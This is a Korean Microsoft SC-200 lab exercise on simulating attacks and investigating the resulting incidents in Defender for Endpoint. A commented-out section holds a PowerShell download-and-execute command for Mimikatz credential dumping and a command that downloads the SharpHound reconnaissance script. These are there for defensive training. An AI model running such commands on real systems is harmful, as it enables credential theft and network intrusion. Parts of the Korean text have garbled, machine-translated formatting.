---
lab:
  title: 연습 2 - 엔드포인트용 Microsoft Defender를 사용하여 공격 완화
  module: Learning Path 2 - Mitigate threats using Microsoft Defender for Endpoint
---

# 학습 경로 2 - 랩 1 - 연습 2 - 엔드포인트용 Microsoft Defender를 사용하여 위협 완화

## 랩 시나리오

![랩 개요입니다.](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

여러분은 엔드포인트용 Microsoft Defender를 구현하고 있는 회사에서 일하는 보안 운영 분석가입니다. 관리자는 몇 가지 디바이스를 온보딩하여 SecOps(Security Operations) 팀 응답 프로시저에 필요한 변경 내용에 대한 인사이트를 제공할 계획입니다.

엔드포인트용 Defender 공격 완화 기능을 탐색하려면 두 개의 시뮬레이션된 공격을 실행합니다.

>**참고:** **[대화형 랩 시뮬레이션](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** 을 사용하여 이 랩을 원하는 속도로 클릭할 수 있습니다. 대화형 시뮬레이션과 호스트된 랩 간에 약간의 차이가 있을 수 있지만 보여주는 핵심 개념과 아이디어는 동일합니다.


### 작업 1: 디바이스 온보딩 확인

이 작업에서는 디바이스가 성공적으로 온보딩되었는지 확인하고 테스트 경고를 만듭니다.

1. Microsoft Edge 브라우저의 Microsoft Defender XDR 포털에 아직 없는 경우 테넌트에 대한 관리(로 로그인)https://security.microsoft.com)합니다.

1. 왼쪽 메뉴**의 자산 영역에서 디바이스**를** 선택합니다**. 계속하기 전에 WIN1이 디바이스 페이지에 나타날 때까지 기다려 주세요. 그렇지 않으면, 나중에 생성될 경고를 보기 위해 이 작업을 반복해야 할 수 있습니다.

    >**참고:** 온보딩 프로세스를 완료하고 1시간 후에 디바이스 목록에 디바이스가 표시되지 않으면 온보딩 또는 연결 문제가 표시될 수 있습니다.

1. 왼쪽 메뉴 모음에서 설정** 선택한 **다음 설정 페이지에서 엔드포인트를** 선택합니다**.

1. 디바이스 관리 섹션에서 온보딩을** 선택하고 **"Windows 10 및 11"*이 운영 체제로 선택되어 있는지 확인*합니다. *이제 "온보딩된 첫 번째 디바이스"* 메시지가 완료됨*으로 표시됩니다*.

1. "2" 섹션 *아래로 스크롤합니다. 검색 테스트 실행"*, 복사 단추를 선택하여 검색 테스트 스크립트를 **복사** 합니다.  

1. WIN1 가상 머신의 Windows 검색 창에서 **CMD**를 입력하고 명령 프롬프트 앱의 오른쪽 창에서 **관리자 권한으로 실행**을 선택합니다. 

1. “사용자 계정 컨트롤” 창이 표시되면 **예**를 선택하여 앱을 실행할 수 있도록 합니다. 

1. 관리istrator: 명령 프롬프트** 창을 마우스 오른쪽 단추로 클릭하여 **스크립트를 붙여넣고 Enter** 키를 눌러 **실행합니다.

    >**참고:** 스크립트를 실행한 후 창이 자동으로 닫힙니다.

### 작업 2: 시뮬레이션된 공격

>**참고:** 포털의 평가 랩 및 자습서 및 시뮬레이션 섹션을 더 이상 사용할 수 없습니다. 다음 단계는 참조용으로만 제공됩니다. 시뮬레이션된 **[공격에 대한 데모는 대화형 랩 시뮬레이션](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** 을 참조하세요. 시뮬레이션된 공격에 대한 대체 항목을 찾기 위해 노력하고 있습니다.

<!--- In this task, you will run two *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.

`Attack 1: Mimikatz - Credential Dumping`

1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.

1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.

1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.

`Attack 2: Bloodhound - Collection`

1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.

1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.

1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.

1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*. --->

1. 왼쪽 메뉴의 엔드포인트에서 **평가 및 자습서를** 선택한 **다음 왼쪽에서 자습서 및 시뮬레이션을** 선택합니다**.**

1. **자습서** 탭을 선택합니다.

1. 자동화된 조사(백도어)*에서 *시나리오를 설명하는 메시지가 표시됩니다. 이 단락 아래에서 **연습 확인**을 클릭합니다. 시뮬레이션을 수행하는 지침이 포함된 새 브라우저 탭이 열립니다.

1. 새 브라우저 탭에서 **시뮬레이션 실행**이라는 섹션(페이지 5, 2단계부터)을 찾고 단계에 따라 공격을 실행합니다. **힌트:** 시뮬레이션 파일 *RS4_WinATP-Intro-Invoice.docm*은 시뮬레이션 파일** 가져오기 단추를 선택하여 **이전 단계에서 선택한 연습** 읽기 바로 아래 **포털에서 다시 찾을 수 있습니다.

<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->

### 작업 3: 공격 조사

1. Microsoft Defender XDR 포털**의 왼쪽 메뉴 모음에서 인시던트 및 경고를** 선택한 다음, 인시던트(Incidents **)를 선택합니다**.

1. "한 엔드포인트에서 검색된 여러 위협 패밀리"라는 새 인시던트가 오른쪽 창에 있습니다. 인시던트 이름을 선택하여 세부 정보를 로드합니다.

    >**참고:** 경고** 창에 Bloodhound* 및 Mimikatz* 경고가 **모두 *표시됩니다. 자산/디바이스***에서 **win1* 컴퓨터는 **이제 위험 수준이** *높습니다*.

1. **인시던트 관리** 단추를 선택하면 새 창 블레이드가 나타납니다. 

1. 인시던트 태그 아래에 **"시뮬레이션"을** 입력하고 시뮬레이션(새로 만들기)**을 선택하여 **새 태그를 만듭니다. 

1. **내게 할당** 토글을 선택하여 사용자 계정(Me)을 인시던트 소유자로 추가합니다. 

1. **분류** 아래에서 드롭다운 메뉴를 확장합니다. 

1. **정보, 예상 작업**에서 **보안 테스트**를 선택합니다. 

1. 원하는 경우 메모를 추가하고 저장**을 선택하여 인시던트 업데이트 및 완료를 선택합니다**.

1. 공격 스토리, 경고, 자산, 조사, 증거 및 대응* 및 *요약* 탭의 내용을 *검토합니다. 디바이스 및 사용자가 자산 탭 아래에 *있습니다*. *공격 스토리* 탭에는 인시던트 그래프*가 *표시됩니다. **힌트:** 표시 크기 때문에 일부 탭이 숨겨질 수 있습니다. 줄임표 탭(...)을 선택하여 해당 탭을 표시합니다.

    >**경고:** 여기서 시뮬레이션된 공격은 연습을 통한 학습의 훌륭한 소스입니다. 강좌 제공 Azure 테넌트 사용 시 이 랩에 제공된 지침에서만 공격을 수행합니다.  이 테넌트에서 *이 교육 과정을 완료한 후* 다른 시뮬레이션된 공격을 수행할 수 있습니다.

## 랩을 완료했습니다.
